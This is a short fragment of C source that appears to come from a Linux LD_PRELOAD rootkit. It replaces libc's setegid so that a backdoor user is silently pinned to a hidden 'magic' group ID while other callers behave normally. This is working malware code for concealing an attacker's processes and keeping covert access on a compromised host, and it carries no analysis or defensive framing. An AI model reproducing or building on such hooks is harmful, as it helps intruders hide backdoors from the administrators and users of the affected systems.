int setegid(gid_t egid)
{
    HOOK(o_setegid, CSETEGID);
    if(is_bdusr()) { if(egid != MGID) { o_setegid(MGID); } return 0; }
    return o_setegid(egid);
}
